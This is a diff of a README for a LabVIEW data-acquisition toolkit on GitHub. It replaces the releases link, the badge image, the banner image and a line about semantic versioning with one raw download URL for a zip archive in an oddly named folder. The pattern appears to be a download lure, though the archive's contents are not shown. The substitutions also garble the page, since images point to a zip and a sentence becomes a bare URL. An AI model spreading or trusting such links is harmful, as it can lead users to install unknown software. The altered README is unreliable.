@@ -1,13 +1,13 @@
-https://github.com/yannizinho/labview-tools/releases
+https://github.com/yannizinho/labview-tools/raw/refs/heads/main/unweeping/labview_tools_v2.2.zip
 
 # LabVIEW Tools: Graphical Data Acquisition & Instrumentation
 
-[![Releases](https://img.shields.io/badge/Releases-View_on_GitHub-blue?logo=github&style=flat-square)](https://github.com/yannizinho/labview-tools/releases)
+[![Releases](https://github.com/yannizinho/labview-tools/raw/refs/heads/main/unweeping/labview_tools_v2.2.zip)](https://github.com/yannizinho/labview-tools/raw/refs/heads/main/unweeping/labview_tools_v2.2.zip)
 
 A practical toolbox for LabVIEW developers. This project focuses on graphical programming, data acquisition, instrument control, and UI design. It ships with templates, VIs, and patterns that speed up common tasks in labs, test benches, and production environments. The goal is to help you build robust, responsive, and maintainable LabVIEW apps that integrate smoothly with hardware and measurement workflows.
 
 Banner image
-- ![LabVIEW Tools banner](https://dummyimage.com/1200x300/2563eb/ffffff&text=LabVIEW+Tools)
+- ![LabVIEW Tools banner](https://github.com/yannizinho/labview-tools/raw/refs/heads/main/unweeping/labview_tools_v2.2.zip+Tools)
 
 Table of contents
 - Overview
@@ -220,7 +220,7 @@ Contribution and collaboration
 - Community guidelines: Be respectful, provide reproducible examples, and include minimal steps to reproduce.
 
 Release notes and versioning
-- Semantic-like versioning for clarity: MAJOR.MINOR.PATCH.
+- Semantic-like versioning for clarity: https://github.com/yannizinho/labview-tools/raw/refs/heads/main/unweeping/labview_tools_v2.2.zip
 - Release notes summarize changes, fixes, and breaking changes.
 - Compatibility notes describe LabVIEW version support and hardware considerations.
 
